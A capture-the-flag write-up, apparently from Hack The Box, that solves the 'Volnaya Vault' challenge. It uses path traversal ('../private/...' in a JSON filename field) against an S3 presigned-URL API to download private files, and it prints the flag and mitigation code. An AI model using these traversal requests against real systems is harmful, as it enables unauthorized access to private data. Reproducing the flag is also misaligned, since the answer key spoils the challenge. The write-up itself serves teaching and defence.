# Volnaya Vault - CTF Write-Up

## Challenge Overview

**Challenge Name:** Volnaya Vault  
**Category:** Cloud Security / AWS S3 Misconfiguration  
**Difficulty:** easy  
**Flag:** `HTB{Tr4v3rsing_buck3ts_4fun}`

This challenge demonstrates a **path traversal vulnerability** in an API endpoint that generates AWS S3 presigned URLs. The vulnerability allows attackers to bypass access controls and retrieve sensitive files from private S3 bucket directories.

## Initial Reconnaissance

### Application Analysis
The target URL reveals a React application called "Volnaya Vault" - a document management system hosted on AWS S3 static website hosting.

```bash
curl -s "http://volnaya-vault-static-website.s3-website.eu-north-1.amazonaws.com/"
```

### S3 Bucket Discovery
Through enumeration, we discover the main S3 bucket:

```bash
curl -s "https://volnaya-vault.s3.eu-north-1.amazonaws.com/" | head -20
```

**Key Discovery:** The bucket contains both public and private directories:
- `vault/public/` - Contains public documents (accessible)
- `vault/private/` - Contains sensitive files (access denied)

**Private files identified:**
- `vault/private/DIRECTORATE ALPHA & BETA FIELD OPERATIVES.docx`
- `vault/private/_Post-Assessment Report.pdf`

## Vulnerability Analysis

### Root Cause Analysis
The backend API responsible for generating presigned URLs has a critical flaw:
1. **Insufficient Input Validation:** User input is not properly sanitized
2. **Path Construction Vulnerability:** Direct concatenation allows path traversal
3. **Overprivileged IAM Role:** AWS credentials have broader permissions than needed

### Attack Flow
```
User Input: "../private/sensitive.docx"
     ↓
API Processing: "/vault/public/" + "../private/sensitive.docx"
     ↓  
Resolved Path: "/vault/private/sensitive.docx"
     ↓
Presigned URL: Generated with valid AWS credentials
     ↓
File Access: Unauthorized access to private file
```

## Exploitation Strategy

### Step 1: JavaScript Analysis

Download and analyze the React application's JavaScript bundle:

```bash
curl -s "http://volnaya-vault-static-website.s3-website.eu-north-1.amazonaws.com/assets/index-3xJTFlOo.js" -o index.js

# Search for API endpoints
grep -o "http://volnaya-vault-lb-[^\"]*" index.js
```

**Critical Discovery:** Backend API endpoints:
- `http://volnaya-vault-lb-69672775.eu-north-1.elb.amazonaws.com/api/files`
- `http://volnaya-vault-lb-69672775.eu-north-1.elb.amazonaws.com/api/download`

### Step 2: API Endpoint Testing

Test the discovered endpoints:

```bash
# List available files
curl -s "http://volnaya-vault-lb-69672775.eu-north-1.elb.amazonaws.com/api/files"
```

**Response shows only PUBLIC files:**
```json
[
  {"classification":"PUBLIC","id":"VOL-2025-1A93E507","name":"Canteen_Water_Safety_Bulletin_2024_Q1.txt"},
  {"classification":"PUBLIC","id":"VOL-2025-D5E31294","name":"PR_Volnaya_Cyber_Forces_Image_Pack_Approved.zip"},
  {"classification":"PUBLIC","id":"VOL-2025-318F44EA","name":"Vehicle_Log_Update_VZ-TRK-1138.txt"},
  {"classification":"PUBLIC","id":"VOL-2025-64AACBC1","name":"propaganda.png"}
]
```

### Step 3: Download API Analysis

Test the download API with a known private filename:

```bash
curl -s -X POST "http://volnaya-vault-lb-69672775.eu-north-1.elb.amazonaws.com/api/download" \
  -H "Content-Type: application/json" \
  -d '{"filename":"DIRECTORATE ALPHA & BETA FIELD OPERATIVES.docx"}'
```

**Observation:** The API generates a presigned URL with incorrect path:
- **Generated:** `/vault/public/DIRECTORATE ALPHA & BETA FIELD OPERATIVES.docx`
- **Expected:** `/vault/private/DIRECTORATE ALPHA & BETA FIELD OPERATIVES.docx`

### Step 4: Path Traversal Exploitation

Use path traversal to access private files:

```bash
curl -s -X POST "http://volnaya-vault-lb-69672775.eu-north-1.elb.amazonaws.com/api/download" \
  -H "Content-Type: application/json" \
  -d '{"filename":"../private/DIRECTORATE ALPHA & BETA FIELD OPERATIVES.docx"}'
```

**Success!** The API now generates a presigned URL with the correct private path:
- **Result:** `/vault/private/DIRECTORATE ALPHA & BETA FIELD OPERATIVES.docx`

### Step 5: Private File Access

Extract the presigned URL from the API response and download the private file:

```bash
# Use the presigned URL to download the file
curl -s "https://volnaya-vault.s3.eu-north-1.amazonaws.com/vault/private/DIRECTORATE%20ALPHA%20%26%20BETA%20FIELD%20OPERATIVES.docx?[PRESIGNED_URL_PARAMETERS]" \
  -o DIRECTORATE_ALPHA_BETA_OPERATIVES.docx
```

Similarly, access the second private file:

```bash
curl -s -X POST "http://volnaya-vault-lb-69672775.eu-north-1.elb.amazonaws.com/api/download" \
  -H "Content-Type: application/json" \
  -d '{"filename":"../private/_Post-Assessment Report.pdf"}'
```

### Step 6: Flag Extraction

Search the downloaded files for the flag:

```bash
# Check file type
file DIRECTORATE_ALPHA_BETA_OPERATIVES.docx
# Output: Microsoft Word 2007+

# Extract flag from Word document
strings DIRECTORATE_ALPHA_BETA_OPERATIVES.docx | grep "HTB"
```

**Flag Found:** `HTB{Tr4v3rsing_buck3ts_4fun}`

## Attack Chain Summary

```
1. S3 Bucket Enumeration → 2. JavaScript Analysis → 3. API Discovery → 4. Path Traversal Testing → 5. Private File Access → 6. Flag Extraction
```

## Key Vulnerabilities Exploited

1. **Path Traversal:** Using `../` sequences to escape intended directory scope
2. **Insufficient Input Validation:** API accepts unsanitized user input
3. **Overprivileged IAM Role:** AWS credentials allow broader access than intended
4. **Information Disclosure:** Sensitive files accessible through API manipulation

## Mitigation Recommendations

### Immediate Fixes

1. **Input Validation:** Implement strict validation to reject path traversal attempts
   ```javascript
   function validateFilename(filename) {
     if (filename.includes('../') || filename.includes('..\\')) {
       throw new Error('Path traversal detected');
     }
     return filename;
   }
   ```

2. **Whitelist Approach:** Only allow access to explicitly permitted files
   ```javascript
   const ALLOWED_FILES = ['file1.txt', 'file2.pdf']; // From database
   if (!ALLOWED_FILES.includes(filename)) {
     throw new Error('File not found');
   }
   ```

### Long-term Security Measures

1. **Principle of Least Privilege:** Create separate IAM roles with minimal required permissions
2. **Directory-based Access Control:** Implement proper authorization checks before generating presigned URLs
3. **Input Sanitization:** Use path resolution libraries to normalize paths
4. **Security Testing:** Regular penetration testing for path traversal vulnerabilities

### Example Secure Implementation
```javascript
const path = require('path');

function generateSecurePresignedUrl(filename, userRole) {
  // Validate and sanitize input
  const sanitizedFilename = path.basename(filename);
  
  // Check authorization
  if (!isAuthorizedForFile(sanitizedFilename, userRole)) {
    throw new Error('Access denied');
  }
  
  // Construct safe path
  const safePath = path.join('/vault/public/', sanitizedFilename);
  
  // Generate presigned URL
  return s3.getSignedUrl('getObject', {
    Bucket: 'volnaya-vault',
    Key: safePath,
    Expires: 3600
  });
}
```

## Technical Concepts

1. **AWS S3 Presigned URLs:** Temporary URLs that provide time-limited access to S3 objects
2. **Path Traversal:** Directory traversal using `../` sequences to access unauthorized files
3. **IAM Role Security:** Proper configuration of AWS Identity and Access Management roles
4. **Static Website Hosting:** Understanding S3 static website hosting limitations and security

## Tools and Techniques Used

- **curl:** HTTP request testing and file downloading
- **AWS S3 API:** Bucket enumeration and object listing
- **JavaScript Analysis:** Static analysis of minified React code
- **Path Traversal:** Directory traversal using `../` sequences
- **Presigned URL Exploitation:** Leveraging AWS temporary credentials

## Alternative Attack Vectors

While we used path traversal, other potential approaches might include:
- **Direct S3 bucket policy analysis** (if misconfigured)
- **IAM role assumption** (if credentials are leaked)
- **Bucket enumeration** using tools like `aws s3 ls` with `--no-sign-request`
- **CORS misconfiguration** exploitation
- **Bucket notification exploitation**

## Write-Up Credit: [binchickens69](https://ctf.hackthebox.com/user/profile/605069)